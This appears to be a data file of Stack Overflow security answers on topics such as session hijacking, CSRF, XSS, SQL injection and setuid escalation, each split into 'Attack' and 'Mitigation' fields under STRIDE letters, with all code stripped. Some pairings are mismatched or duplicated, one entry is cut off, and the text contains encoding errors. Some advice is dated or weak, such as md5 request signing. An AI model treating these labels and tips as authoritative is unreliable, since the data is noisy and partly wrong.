    "Mitigation": " Setting the permissions correctly (this will depend on your set up). Ideally only python should be able to read the file.Storing the file out of the [CODE] or [CODE] root. If at this point an attacker still has access to them, you are screwed anyways.For added security, you can encrypt the connection settings using symmetric encryption (eg: AES). Store the key somewhere else. So even if someone managed to access the connection settings, they'd still need to find the key. The main drawback is that now you have to rewrite the connection method. "
  },
  {
    "Threat": "T",
    "Attack": " Create a script &amp; run it to create automatic users  - I think I can prevent it by CAPTCHA or someting like that. But again, captcha will annoy game players.Malicious user logs in using his browser, downloads game &amp; then submits score as he wish - all via calling the API by simply typing it from his browser. I assume malicious user somehow knows API urls to call - by sniffing when the application was making HTTP requests.I need to ensure that requests are made only from Android device that installed the game. (The game will be free) ",
    "Mitigation": " create a secret keybuild the api request (eg. [LINK])hash this request path + plus your secret key (eg. md5(url+secret_key) == \"a3c2fe167\")add this hash to your request (now it is [LINK])on the api end, do the same conversion (remove the hash param)check the md5 of the url and the secret key  As long as the secret remains secret, no one can forge your requests.  Example (in pseudo-code):  Android side:  [CODE]  Server side:  [CODE] "
  },
  {
    "Threat": "S",
    "Attack": " PGP requires to store keys on client app.There seems to be no assuring way of securing keys on client app.If the key is out, then PGP or Symmetric encryption are equally vulnerable.Reverse-Engineering PGP keys or symmetic keys is equally hard.In that case PGP is a non-sense burden on the mobile processor.OAuth is again useless, since it also have a client key.  Use simple SSL and cross my fingers ?, since authentication is not possible if the keys are stolen? (Only server authentication is possible with this) ",
    "Mitigation": " Here's the high-level approach. Create a self-signed server SSL certificate and deploy on your web server. If you're using Android, you can use the keytool included with the Android SDK for this purpose; if you're using another app platform like iOS, similar tools exist for them as well. Then create a self-signed client and deploy that within your application in a custom keystore included in your application as a resource (keytool will generate this as well). Configure the server to require client-side SSL authentication and to only accept the client certificate you generated. Configure the client to use that client-side certificate to identify itself and only accept the one server-side certificate you installed on your server for that part of it.  If someone/something other than your app attempts to connect to your server, the SSL connection will not be created, as the server will reject incoming SSL connections that do not present the client certificate that you have included in your app.  A step-by-step for this is a much longer answer than is warranted here. I would suggest doing this in stages as there are resources on the web about how to deal with self-signed SSL certificate in both Android and iOS, both server and client side. There is also a complete walk-through in my book, [LINK], published by O'Reilly. "
  },
  {
    "Threat": "S",
    "Attack": " Most Web Applications use cookies to manage the session for a user and allow you to stay logged in even if the browser was closed.Let's assume we did everything by the book to make sure the cookie itself is safe.encrypt the contentset http onlyset securessl is used for the connectionwe check for tampering with the content of the cookieIs it possible to prevent someone with physical access to the machine to copy the cookie and reuse it on another machine and thus stealing the session? ",
    "Mitigation": " This is why you see further protections such as: "
  },
  {
    "Threat": "E",
    "Attack": " This constitues a vulnerability only if the code is run as privileged user.  Note that the setting of real user ID, effective user ID and saved set-user-ID by a call to [CODE] before the call to [CODE] in the vulnerable code posted in the question allows one to exploit the vulnerability even when only effective user ID is set to a privileged user ID and real user ID remains unprivileged (as is for example the case when relying on set-user-ID bit on a file as above). Without the call to [CODE] the shell run by [CODE] would reset the effective user ID back to the real user ID making the exploit ineffective. However, in the case when the vulnerable code is run with real user ID of a privileged user, [CODE] call alone is enough. Quoting [CODE] man page: ",
    "Mitigation": "   If the shell is started with the effective user (group) id not equal to the real user   (group) id, and the -p option is not supplied, no startup files  are  read, shell functions are not inherited from the environment, the SHELLOPTS variable, if it   appears in the environment, is ignored, and the effective user  id is set to the real user id.  If the -p option is supplied at invocation, the startup   behavior is the same, but the effective user id is not reset.  Also, note that [CODE] isn't portable, but [CODE] or [CODE] may also be used to the same effect. "
  },
  {
    "Threat": "S",
    "Attack": " If I understood it correctly, the goal of the same-origin policy is to prevent CSRF attacks and the goal of CORS is to enable resource sharing if (and only if) the server agrees to share its data with applications hosted on other sites (origins). ",
    "Mitigation": " See [LINK].The reason CORS doesn't require browsers to do a preflight for [CODE], [CODE], or [CODE] content types is that if it did, that make CORS more restrictive than what browsers have already always allowed (and it's not the intent of CORS to put new restrictions on what was already possible without CORS).That is, with CORS, POST requests that you could do previously cross-origin are not preflighted because browsers already allowed them before CORS existed, and servers knew about them. So CORS changes nothing about those ld?types of requests.But prior to CORS, browsers wouldn't allow you to do a cross-origin [CODE] POST at all, and so servers could assume they wouldn't receive them. That's why a CORS preflight is required for those types of ew?requests and not for the ld?oneso give a heads-up to the server: this is a different ew?type of request that they must explicitly opt-in to supporting. "
  },
  {
    "Threat": "S",
    "Attack": " The difference between a refresh token and a non-expiring access token in means of security is one additional call to the authorization server.If an attacker gains access to your non-expiring access token, he can directly call your resource server and get confidential data as response.<br />Now if he steals your refresh token, he first has to call the authorization server and receive an access token in response. Then he can query the resource server for confidential data. ",
    "Mitigation": " Each time an access token is requested from your authorization server using a refresh token, the OAuth 2 specification (at least the latest draft for now) requires the server to [LINK], if possible.As the normal approach with a client secret does not work to definitly identify an installed application on an open platform, the platform running the application has to provide methods to do this. Google e.g. requires Android applications to be signed by the developer. When requesting credentials for an Android application using the [LINK], you therefore have to specify [LINK] and only get a client ID, but no secret in response. On issuing tokens, Google can then decide if the application was authorized by the developer to request tokens in his name.If you definitly can't verify the client identity, it is at least possible in some cases to recognize that a refresh token was stolen. The specification has an [LINK]:When client authentication is not possible, the authorization server SHOULD deploy other means to detect refresh token abuse.For example, the authorization server could employ refresh token rotation in which a new refresh token is issued with every access token refresh response.  The previous refresh token is invalidated but retained by the authorization server.  If a refresh token is compromised and subsequently used by both the attacker and the legitimate client, one of them will present an invalidated refresh token, which will inform the authorization server of the breach. "
  },
  {
    "Threat": "S",
    "Attack": " I read it's possible to put the form on http but post it to https, but I read someone saying that it can be exploited with a man in the middle attack. Can someone confirm this? I have a 100 point bounty for someone who can confirm this (and help me with a practical answer how to securely solve this). My login form is on every page, do I need to make the whole website on https? Please feel free to question anything I said here. They're only things I read but don't have experience with and didn't try it myself.    I read it's possible to put the form on http but post it to https, but I read someone saying that it can be exploited with a man in the middle attack. Can someone confirm this?  Yes. The form is served up over HTTP, so a man in the middle could inject changes to it (e.g. so it sends credentials to their own server before the form submits). ",
    "Mitigation": " If security really matters?use HTTPS for the entire site. Even after the password has been sent, if you go back to HTTP then the cookie can be stolen (see [LINK])   If security doesn't matter that much, then don't put the login form on every page. Just have a link to a login page instead. "
  },
  {
    "Threat": "T",
    "Attack": " Always assume that the code is 100% hackable. Think of ways to prevent a client completely rewritten (for the purposes of cheating) from cheating. These can be things such as methods for writing a secure game protocol, server-side detection, etc.  Your server is going to send all the visual data that the client needs to render the screen. You can not obscure this data away. No matter what you try a silled hacker can take your code and slow it down in the debugger editing it as he goes along until all he's left with is a primitive wrapper around your websocket. He let's you run the entire authentication but there is nothing you can do to stop him from stripping out any JavaScript you write from stopping him doing that. All you can achieve with that is limit the amount of hackers skilled enough of accessing your websocket.   So the hacker now has your websocket in a chrome sandbox. He sees the input. Of course your race course is dynamically and uniquely generated. If you had a set amount of them then the hacker could pre engineer the optimum race route. The data you send to visualise this map can be rendered faster then human interaction with your game and the optimum moves to win your racing game can be calculated and send to your server.   If you were to try and ban players who reacted too fast to your map data and call them bots then the hacker adjusts this and adds a delay. If you try and ban players who play too perfectly then the hacker adjusts this and plays less then perfect using random numbers. If you place traps in your map that only algorithmic bots fall into then they can be avoided by learning about them, through trial and error or a machine learning algorithm. There is nothing you can do to be absolutely secure.  ",
    "Mitigation": " You have only ONE option to absolutely avoid hackers. That is to build your own browser which cannot be hacked. Build the security mechanisms into the browser. Do not allow users to edit javascript at runtime in realtime. "
  },
  {
    "Threat": "S",
    "Attack": " If a hacker can get onto your filesystem to see your session file contents, aren't you already hosed at that point?  If you tie the session to an IP address, then it becomes a lot harder to hijack into a session. This is something I recommend doing, but you don't need to be utterly strict about it. You can just tie to the first three parts of the IPv4 or so. The choice is yours. The more strict IP check the more secure it is, but the less convenient it is for users.  And as for tying the session based on the user agent, that may also help. It must be realized that if you work on an unencrypted channel (HTTP for example), then the user agent check is less useful as it can be reproduced by the intruder as well. ",
    "Mitigation": " If you tie the session to an IP address, then it becomes a lot harder to hijack into a session. This is something I recommend doing, but you don't need to be utterly strict about it. You can just tie to the first three parts of the IPv4 or so. The choice is yours. The more strict IP check the more secure it is, but the less convenient it is for users.  When it comes to salting and hashing, that is useless. They add no strength to your identity checks. The only thing they do is complicate your design. For this matter, I believe they lower your level of security.  Use strong session identifiers. This means use good random sources and make sure there are enough bits.Tie the session to an IP, at least to some extent.Tie the session to a user agent, if possible.Use SSL/TLS. Without it, theoretically all session systems are insecure.Secure your session storage. Whether it's filesystem based or database based. "
  },
  {
    "Threat": "S",
    "Attack": " [LINK][LINK] ",
    "Mitigation": " Consider using [LINK] to do against it.  Also have a look at:  [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " Is it possible for a user to craft malicious input that could do something egregious when the object is unpickled?  Yes - depending on what you plan to do with the information in the object later, a user can do all sorts of things. From SQL injection attempts, to changing credentials, brute force password cracking, or anything that should be considered when you're validating user input. But you are probably checking for all this. ",
    "Mitigation": "   Warning The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.  However this is not your case - you accept the input, put it through the regular validation, and then pickle it. "
  },
  {
    "Threat": "I",
    "Attack": " Using cookies works, and is a common practice (e. g. [LINK]). The attacker cannot read or change the value of the cookie due to the same-origin policy, and thus cannot guess the right GET/POST parameter. ",
    "Mitigation": " Using cookies works, and is a common practice (e. g. [LINK]). The attacker cannot read or change the value of the cookie due to the same-origin policy, and thus cannot guess the right GET/POST parameter. "
  },
  {
    "Threat": "I",
    "Attack": " My understanding is that a salt is not intended to be secret, it is merely intended to be different from any centralized standard so that you can't develop a rainbow table or similar attack to break all hashes that use the algorithm, since the salt breaks the rainbow table.  My understanding here might not be completely correct, so correct me if I'm wrong.  In a widely-used piece of open-source software, the salt would be widely known, and this opens you up to attacks because now they can simply attack the salted version of your hash and create rainbow tables that include the salt data. ",
    "Mitigation": " update: use a competent library e.g. [LINK] for Python.  These take care of generating a per-password salt and they use a proper hashing algorithm (its not enough to just use a cryptographic hash such as SHA1; you have to apply it in a way that makes it very slow to reverse e.g. looping 1000 or more times over it etc.  This is how password hash functions like [LINK] work.  Password storing libraries do all this properly; they typically produce a string that is delimited so they can determine the hash system and work factor used; you just store the string without needing to know this. "
  },
  {
    "Threat": "T",
    "Attack": " When you're making serious web apps that'll handle large amounts of data, what precautions should I take against my data inputs to fully sanitise it? I know there's the obvious trim, escaping, xss cleaning, etc - but what other techniques should I incorporate to stop injections into the database? ",
    "Mitigation": " SQL Injection and XSS are the most common mistakes that programmers make.  The good news is that they are easiest to automatically test for, as long as you have the right software.  When I am on a pentest I use [LINK] or [LINK] for finding web application vulnerabilities.  Acunetix is over priced.  1) make sure display_errors=On in your php.ini  Sql Injection tests rely on being able to see mysql error messages in the response pages! No error, no vulnerability detected!  2)  Scan the authenticated areas of your application.  Create a user account specifically for testing. Acuentix has an easy wizard where you can create a login sequence.  If you are using wapiti you can give a cookie to wapiti or give wapiti a post request to fire off but this is kind of tricky.   AFTER you have tested your application then test your server for misconfiguration. To test your server then you need to run [LINK] which is the new more free version of Nessus which is now a commercial product.   Then you should follow this up with [LINK].  These tests will notify you of problems with your configuration or if you are running old vulnerable software.  There is also the [LINK]  which goes into greater detail.  This is not to be confused with the [LINK] which is also an excellent resource. The [LINK] is also a great resource for php programmers.  "
  },
  {
    "Threat": "E",
    "Attack": " I'm creating an app for android and ios, and i already know that it's theoretically possible to decompile an android app. The app contains sensitive information that i don't want users to have access to as the app interfaces with a webserver. If a user gained access to some information available in the source code, they could potentially spam my web server with requests. ",
    "Mitigation": " [UPDATE]   **  When you build your application using Android gradle plugin version > 3.4.0, the plugin chooses R8 to optimize and obfuscate the code. The rules can now be configured on proguard-rules.pro or proguard-app.conf files. the rules to indicate what to exclude from the obfuscation are similar to the ones in proguard.cfg used earlier.  You can import your proguard files in your build.gradle like  [CODE]  [LINK] picks up all the existing proguard rules files as long as they're included in the build.gradle. You can also [LINK] what pieces to obfuscate for different product flavors that you may have.  **  [OLD BUT RELEVANT INFO]  [LINK] is a tool that will help you obfusate your code. This comes as part of your android tools and you just need to activate it. [LINK] link and [LINK] will help further.  Proguard's default configuration (in proguard.cfg) will be enough to sufficiently obfuscate your code. However you might want to tweak your proguard configuration when you have methods/classes that are being dynamically accessed.  For instance, accessing classes/methods with Reflection will need you to have the code to be intact. You might sometimes experience ClassNotFoundException if proguard obfuscates it.If you have classes that are being accessed in the AndroidManifest/ Layout Files, you should prevent proguard from obfuscating them.  This can be done by adding   [CODE]  to your proguard.cfg.  **  While Proguard makes static analysis harder, DexGuard protects from both static and dynamic analysis. [LINK] is specifially for android applications and is only commercially available while Proguard is open source and is for any java bytecode obfuscation / optimization. "
  },
  {
    "Threat": "S",
    "Attack": " JWT does not protect you to a man-in-the-middle (MITM) attack. If an attacker gets a valid token, can effectively impersonate. Even if the content is encrypted. ",
    "Mitigation": " JWT should be used with a SSL/TLS connection to avoid MITM "
  },
  {
    "Threat": "T",
    "Attack": " There where no SQL calls, so I wasn't afraid for SQL Injection. But, apparently, SQL isn't the only kind of injection.  This website has an explanation and a few examples of avoiding code injection: [LINK]  How would you protect this code from code injection? ",
    "Mitigation": " Use a whitelist and make sure the page is in the whitelist:  [CODE] "
  },
  {
    "Threat": "T",
    "Attack": " I am curious, what makes [LINK] secure from XSS based attacks? They have a support for accounts so clearly any script they run on the browser may do evil things. ",
    "Mitigation": " If you look at the results pane for a fiddle you'll notice that it's actually an IFRAME pointing to a different domain which means that built in security will kick in which generally prevents access to the parent window.   This fiddle for example : [LINK]  Is actually served by : [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " For example, they mention the scenario where someone might hijack DNS server and then inject maliciously modified library, opening the door for different security attacks. Now, if hacker can inject malicious code through Google CDN, then he can probably do the same if jQuery is served from the site itself, right? ",
    "Mitigation": " One way to mitigate the risk is to run a checksum against the file obtained from Google, and compare that to a known-good checksum already in your possession.   In response to a question about whether Google alters these files in any way, Google employee [LINK] of a file provided by Google to the canonical version of that same file as obtained from its maintainers' home site. Read comment eight on the linked site for context.  If you're concerned about DNS hijacking, then of course the same concerns would apply to the file as obtained from the \"original\" site. You also probably don't want to incur the speed penalty of running a checksum against the jQuery file on every request -- unless you're incredibly paranoid. And of course, doing so would remove all advantages of using a CDN.  But assuming you're only somewhat paranoid, you could try something like this:  Make sure you're referencing a unique and specific version of the jQuery file from Google. For example, do this:  [CODE]  and not this:  [CODE]  The latter version may return 1.4.2 now, but 1.4.3 tomorrow. If you have a combination of http and https needs, you can use protocol-relative URLs, like this:  [CODE]Initially generate and store your own checksum for this file.Periodically repeat the process, and make sure the new checksum matches the old one. If it doesn't, sound the klaxons.  You can do this programmatically, of course. You decide what interval makes sense. Every minute? Every five? You now have the makings of an automatic kill-switch whose sensitivity you can adjust to your preference. The \"monitor\" routine certainly doesn't have to run synchronously within the application you're looking to secure; perhaps you run a small utility application on the same server just for this purpose.   It's easy enough to test: just alter the stored hash. Since you're referencing a specific file version, the panic button won't be pressed with every minor version update. When you do want to move to a new version of jQuery, change the AJAX API URL on your site and store the new hash. "
  },
  {
    "Threat": "T",
    "Attack": " You should not use this approach. The password should not be stored in an authentication ticket. The reason being is if the authentication ticket is compromised then the attacker has the user's password. This risk can be mitigated by encrypting the authentication ticket cookie, but I presume you were storing the cookie in plain-text. ",
    "Mitigation": " You should not use this approach. The password should not be stored in an authentication ticket. The reason being is if the authentication ticket is compromised then the attacker has the user's password. This risk can be mitigated by encrypting the authentication ticket cookie, but I presume you were storing the cookie in plain-text.  As Shiraz noted, the cookie is only persisted on the client machine if you create a persistent cookie. (One of the parameters to [CODE] indicates whether or not to create such a cookie.  Even if someone broke the encryption scheme to modify the cookie to supply a different username they'd run into problems because the authentication ticket is also digitally signed, meaning ASP.NET can detect if the contents of the cookie have been modified. To forge a digital signature the attacker would need to know the salt used by the server, and if the user can figure that out it implies he has access to your web server's file system, so now you've got bigger problems.  Another thing to understand is that the authentication ticket has an expiry, which puts a finite lifetime on the validity of the ticket. So even if someone were to steal a user's cookies, the time the attacker would have to use that stolen ticket would be limited based on the [CODE] value you specify for the forms authentication system (30 minutes by default).  In conclusion, the official ASP.NET forms authentication system is going to be much more secure than something a lone developer will be able to implement. Developers should strive to use the forms authentication system rather than roll their own solution for a myriad of reasons, including better security, not having to reinvent the wheel, adopting standard practices so other developers who join the team don't have as large a learning curve to get up to speed, and so on.  For more nitty gritty details on the forms authentication system and how the ticket is secured, how the various [CODE] configuration settings work, and so on, see: [LINK]. "
  },
  {
    "Threat": "S",
    "Attack": " Storing the tokens in cookies I not dangerous in itself, but if you somehow get you JWT module on your server to read them from there you vulnerable to CSRF attacks where any webpage can trigger a users browser to send a form + you sites cookie to your server unless you use CSRF tokens. So generally they are stored in localStorage and \"manually\" added to request headers every time.  XSS is when users get unsafe JS running on your domain in other users browsers when that happens neither JWT in localStorage or sessions and JWT in cookies are safe. With httpOnly flag on cookies, you can't directly access them, but the browser will still send them with AJAX requests to your server. If this happens you generally out of luck. To prevent this, make sure to escape all user input if it's sent to the browser.  If you load 3rd party JS with script tags or iframes this might compromise localStorage unless you are careful, but I haven't worked enough with this to help you here. ",
    "Mitigation": " Storing the tokens in cookies I not dangerous in itself, but if you somehow get you JWT module on your server to read them from there you vulnerable to CSRF attacks where any webpage can trigger a users browser to send a form + you sites cookie to your server unless you use CSRF tokens. So generally they are stored in localStorage and \"manually\" added to request headers every time.  XSS is when users get unsafe JS running on your domain in other users browsers when that happens neither JWT in localStorage or sessions and JWT in cookies are safe. With httpOnly flag on cookies, you can't directly access them, but the browser will still send them with AJAX requests to your server. If this happens you generally out of luck. To prevent this, make sure to escape all user input if it's sent to the browser. "
  },
  {
    "Threat": "T",
    "Attack": " My dad called me today and said people going to his website were getting 168 viruses trying to download to their computers. He isn't technical at all, and built the whole thing with a WYSIWYG editor.  So I commented it out for now. It turns out his FTP password was a plain dictionary word six letters long, so we think that's how it got hacked. We've changed his password to an 8+ digit non-word string (he wouldn't go for a passphrase since he is a hunt-n-peck typer). ",
    "Mitigation": " Try and gather as much information as you can. See if the host can give you a log showing all the FTP connections that were made to your account. You can use those to see if it was even an FTP connection that was used to make the change and possibly get an IP address.  If you're using a prepacked software like Wordpress, Drupal, or anything else that you didn't code there may be vulnerabilities in upload code that allows for this sort of modification. If it is custom built, double check any places where you allow users to upload files or modify existing files.  The second thing would be to take a dump of the site as-is and check everything for other modifications. It may just be one single modification they made, but if they got in via FTP who knows what else is up there.  Revert your site back to a known good status and, if need be, upgrade to the latest version.  There is a level of return you have to take into account too. Is the damage worth trying to track the person down or is this something where you just live and learn and use stronger passwords? "
  },
  {
    "Threat": "T",
    "Attack": " I know that I need to prevent JavaScript injection attacks. How do I do this? ",
    "Mitigation": " You can use [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " I have had issues with XSS. Specifically I had an individual inject JS alert showing that the my input had vulnerabilities. I have done research on XSS and found examples but for some reason I can't get them to work. ",
    "Mitigation": " You can use this firefox addon:[LINK]XSS-Me is the Exploit-Me tool used to test for reflected Cross-SiteScripting (XSS). It does NOT currently test for stored XSS.Thetool works by submitting your HTML forms and substituting the formvalue with strings that are representative of an XSS attack. If theresulting HTML page sets a specific JavaScript value(document.vulnerable=true) then the tool marks the page as vulnerableto the given XSS string. The tool does not attempting to compromisethe security of the given system. It looks for possible entry pointsfor an attack against the system. There is no port scanning, packetsniffing, password hacking or firewall attacks done by thetool.You can think of the work done by the tool as the same as theQA testers for the site manually entering all of these strings intothe form fields. "
  },
  {
    "Threat": "E",
    "Attack": " Has anyone heard about PHP Shell Offender Script? It mainly used the eval function for the exploit. Hackers are able to run their PHP code on your site. ",
    "Mitigation": " To disable functions, mainly for security reasons, you can use the [LINK] directive in your [CODE] configuration file.    This directive must be set in php.ini  For example, you cannot set this in  httpd.conf.  Still, the best security measure is to write clean/secure code, filter all input, escape all output... And not let anyone run their own code on your server ! "
  },
  {
    "Threat": "I",
    "Attack": " This is important if the cookie has been hijacked. It will be invalidated if the user detects the hijacking, and furthermore because the token is unrelated to the password the hijacker won't be able to derive and then change the user's account password and \"own\" the account (assuming you require the existing password before changing passwords, the hijacker doesn't own the email account so they can't use \"Forgot my password\" etc). ",
    "Mitigation": " This is important if the cookie has been hijacked. It will be invalidated if the user detects the hijacking, and furthermore because the token is unrelated to the password the hijacker won't be able to derive and then change the user's account password and \"own\" the account (assuming you require the existing password before changing passwords, the hijacker doesn't own the email account so they can't use \"Forgot my password\" etc).  Take care that the tokens aren't easily guessable (i.e. they should consist of entirely random data, like from a CRNG).  If you want to go one step further, you can encrypt the cookie before sending it and decrypt it upon receipt. And further to that, don't assume that a hijacker doesn't know the encryption key used, so validate the cookie's contents upon decryption.  But all that said, prefer to use a library's persistent session management instead of rolling your own. "
  },
  {
    "Threat": "S",
    "Attack": " There's means of [LINK] whenever malicious HTML or JavaScript which is targeted on your website is been embedded in another HTML page (or an email message) which is been successfully executed. ",
    "Mitigation": " To prevent that to happen, your best bet is to add a request based token to the form and validate it in the server side. I.e. generate a long, unique and impossible-to-guess random string which you store in the session and embed as [CODE] element of the form. When the form is submitted, compare the submitted token value with the one already in session (and immediately remove the one in session). To go a step further, make use of a [LINK]. "
  },
  {
    "Threat": "T",
    "Attack": "   \"Cannot Stop Full Replacement. Strong names cannot prevent a hacker from removing the strong name signature, maliciously modifying your assembly, re-signing it with his own key, and then passing off his assembly as yours.\" ",
    "Mitigation": " The following C# code verifies that an attacker hasn't tampered with the public key token that was written to your assembly when you applied the strong name. It doesn't avoid tampering, but it can detect some types of tampering. The method below accepts a byte array containing your public key token, and compares it with the actual token of the assembly. Note that for this technique to be effective, your obfuscator of choice should encrypt the string containing your public key token, and only decrypt it on the fly as it's used. And also be aware that you need to have FullTrust permission for this code to work because it uses reflection underneath the hood.  [CODE]  As long as you're running under a version of the .NET Framework before .NET 3.5 SP1, you can also force verification of the strong name signature in case the strong name was removed by an attacker or the strong name check was disabled in the registry. The following code demonstrates a call into a static method of another class called NativeMethods. This is where the verification will be enforced.  [CODE]  The actual signature verification is done using P/Invoke as shown below. The usage of the StrongNameSignatureVerificationEx API is quite convoluted - for a decent explanation, see [LINK].   [CODE]  Note that this won't work by default for applications using .NET 3.5 SP1 or higher, which has the [LINK]. It's possible to [LINK] for your application by adding a setting to its config file. But of course any attacker with read/write access to that config file can reverse your decision. "
  },
  {
    "Threat": "T",
    "Attack": " The second one is something you should be careful with. Assigning unvalidated values to it can lead to open redirects that can be used for phishing and what's more, XSS issues arising from the use of [CODE] and [CODE] URIs.  Then to the interesting part: [CODE] and [CODE] URIs. These are the ones that will bite you. The JavaScript and VBScript URI schemes are non-standard URI schemes that can be used to execute code in the context of the currently open web page. Sounds bad, doesn't it? Well, it should. Consider our attacker-controlled variable [CODE]: all an attacker has to do to launch an attack against your users is inject a script URI into the variable. When you assign it to [CODE], it's basically the same as calling [CODE] on the script. ",
    "Mitigation": " The second one is something you should be careful with. Assigning unvalidated values to it can lead to open redirects that can be used for phishing and what's more, XSS issues arising from the use of [CODE] and [CODE] URIs.  Edit: As requested, here's a more in-depth explanation of the problems with assiging to [CODE]:  Say you have an attacker controlled variable [CODE]. The source of it can be anything really, but a query string parameter is a good example. When you assign the value of [CODE] to [CODE], what happens? Well, the browser does its best to interpret the value as a URI and then redirects the user to the resulting address. In most cases, this will trigger a page load; e.g. if [CODE] is [CODE], Google's front page will be loaded. Allowing that to happen without user interaction  is known as an [LINK] and is considered a security vulnerability!  There are, however, types of URIs that won't trigger a page load. A common example of such a URI would be one that contains nothing but a fragment identifier, e.g. [CODE]. Assigning that to [CODE] would cause the page to scroll to the element with the ID \"quux\" and do nothing else. Fragment URIs are safe as long as you don't do anything stupid with the values of the fragments themselves.  Then to the interesting part: [CODE] and [CODE] URIs. These are the ones that will bite you. The JavaScript and VBScript URI schemes are non-standard URI schemes that can be used to execute code in the context of the currently open web page. Sounds bad, doesn't it? Well, it should. Consider our attacker-controlled variable [CODE]: all an attacker has to do to launch an attack against your users is inject a script URI into the variable. When you assign it to [CODE], it's basically the same as calling [CODE] on the script.  JavaScript URIs work in all modern browsers, while VBScript is IE-only, and requires the page to be rendered in quirks mode.  Finally, there's one more interesting URI scheme to consider: the data URI. Data URIs are file literals: entire files encoded as URIs. They can be used to encode any files, including HTML documents. And those documents, like any others, can contain scripts.  Most browsers treat each data URI as its own unique [LINK]. That means the scripts in an HTML document wrapped in a data URI can not access any data on other pages. Except in Firefox.  Firefox treats data URIs a bit differently from all other browsers. In it, data URIs inherit the origin of whatever document is opening it. That means any scripts can access the data contained in the referring document. And that's XSS for you. "
  },
  {
    "Threat": "I",
    "Attack": " In Java the old way of storing a secret, such as a password, was to use [CODE] as you could overwrite its data when you were done with it. However this has since been shown to be insecure as the garbage collector will copy things around as it reorganizes the heap. On certain architectures it's possible that a page will be freed and the secret will remain when some other program allocates that same page.  This is horribly ugly, but what if the secret were stored on the stack of a Thread's [CODE] method? Care would still need to be taken to terminate the thread gracefully, so that it could zero out its data, but this problem was present in the old way as well.  One major problem I see straight away is that I can't think of a safe way to get data in and out of the container. You could minimize the likelihood of a leaked secret by using streams with very small internal buffers, but in the end you wind up with the same problem as [CODE]. [Edit: Would a single [CODE] member and a flag work? Although that would limit you to one secret per ClassLoader. This adds more ugliness, but it might be easy enough to hide behind a well-written interface.]  [CODE]  You could store the secret as one or two [CODE]s. ",
    "Mitigation": " I would use a direct ByteBuffer.  The memory this uses is not copied around and is only in one place for the life of the ByteBuffer.  BTW don't use clear() as this just resets the position.  You can overwrite it with   [CODE] "
  },
  {
    "Threat": "T",
    "Attack": " Reflection can not be turned off altogether; it's always possible to reflect on its own public fields/methods. Reflection on private structures with [CODE] can however be disabled, because it breaks encapsulation. With access to private fields, etc. inspection and modification of internal data is possible. It can lead to various malicious exploits, e.g.  ",
    "Mitigation": " Reflection can not be turned off altogether; it's always possible to reflect on its own public fields/methods. Reflection on private structures with [CODE] can however be disabled, because it breaks encapsulation. With access to private fields, etc. inspection and modification of internal data is possible. It can lead to various malicious exploits, e.g.  "
  },
  {
    "Threat": "S",
    "Attack": " If you are concerned with the first case (someone posting malicious data to/as another user) the solution is the same whether you are using AJAX or not -- you just have to authenticate the user through whatever means is necessary -- usually via session cookie. ",
    "Mitigation": " If you are concerned with the first case (someone posting malicious data to/as another user) the solution is the same whether you are using AJAX or not -- you just have to authenticate the user through whatever means is necessary -- usually via session cookie. "
  },
  {
    "Threat": "I",
    "Attack": " you need to store the random salt along with your hashgiven that an attacker somehow got access to your hashed passwords (and is trying to reverse the hash to plain text), it means he probably dumped your database, then got access to your random salts also ",
    "Mitigation": " An attacker is \"allowed\" to know the salt - your security must be designed in a way that even with the knowledge of the salt it is still secure.  IF you want to strengthen the security further<br/>You could calculate the hash several times over (hash the hash etc.) - this doesn't cost you much but it makes a brute-force attack / calculating \"rainbow-tables\" even more expensive... please don't invent yourself - there are proven standard methods to do so, see for example [LINK] and [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " I need to avoid being vulnerable to SQL injection in my ASP.NET application. How might I accomplish this? ",
    "Mitigation": " Use parameterized queries ([CODE] with [CODE]) and put user input into parameters.Don't build SQL strings out of unchecked user input.Don't assume you can build a sanitizing routine that can check user input for every kind of malformedness. Edge cases are easily forgotten. Checking numeric input may be simple enough to get you on the safe side, but for string input just use parameters.Check for second-level vulnerabilites - don't build SQL query strings out of SQL table values if these values consist of user input.Use stored procedures to encapsulate database operations. "
  },
  {
    "Threat": "S",
    "Attack": "   <h2>Why the NTLM Plug-in is Needed</h2>    NTLM is an outdated authentication protocol with flaws that  potentially compromise the security of applications and the operating  system. The most important shortcoming is the lack of server  authentication, which could allow an attacker to trick users into  connecting to a spoofed server. As a corollary of missing server  authentication, applications using NTLM can also be vulnerable to a  type of attack known as a \u9225\u6e1eeflection\u9225?attack. This latter allows an  attacker to hijack a user\u9225\u6a9a authentication conversation to a  legitimate server and use it to authenticate the attacker to the  user\u9225\u6a9a computer. NTLM\u9225\u6a9a vulnerabilities and ways of exploiting them  are the target of increasing research activity in the security  community.    Although Kerberos has been available for many years many applications  are still written to use NTLM only. This needlessly reduces the  security of applications. Kerberos cannot however replace NTLM in all  scenarios \u9225?principally those where a client needs to authenticate to  systems that are not joined to a domain (a home network perhaps being  the most common of these). The Negotiate security package allows a  backwards-compatible compromise that uses Kerberos whenever possible  and only reverts to NTLM when there is no other option. Switching code  to use Negotiate instead of NTLM will significantly increase the  security for our customers while introducing few or no application  compatibilities. Negotiate by itself is not a silver bullet \u9225?there  are cases where an attacker can force downgrade to NTLM but these are  significantly more difficult to exploit. However, one immediate  improvement is that applications written to use Negotiate correctly  are automatically immune to NTLM reflection attacks.    By way of a final word of caution against use of NTLM: in future  versions of Windows it will be possible to disable the use of NTLM at  the operating system. If applications have a hard dependency on NTLM  they will simply fail to authenticate when NTLM is disabled.    <h2>How the Plug-in Works</h2>    The Verifier plug detects the following errors:      The NTLM package is directly specified in the call to AcquireCredentialsHandle (or higher level wrapper API).  The target name in the call to InitializeSecurityContext is NULL.  The target name in the call to InitializeSecurityContext is not a properly-formed SPN, UPN or NetBIOS-style domain name.      The latter two cases will force Negotiate to fall back to NTLM either directly (the first case) or indirectly (the domain controller will return a \u9225\u6e1brincipal not found\u9225?error in the second case causing Negotiate to fall back).    The plug-in also logs warnings when it detects downgrades to NTLM; for example, when an SPN is not found by the Domain Controller. These are only logged as warnings since they are often legitimate cases \u9225?for example, when authenticating to a system that is not domain-joined.    <h2>NTLM Stops</h2>    5000 \u9225?Application Has Explicitly Selected NTLM Package    Severity \u9225?Error    The application or subsystem explicitly selects NTLM instead of Negotiate in the call to AcquireCredentialsHandle. Even though it may be possible for the client and server to authenticate using Kerberos this is prevented by the explicit selection of NTLM.    How to Fix this 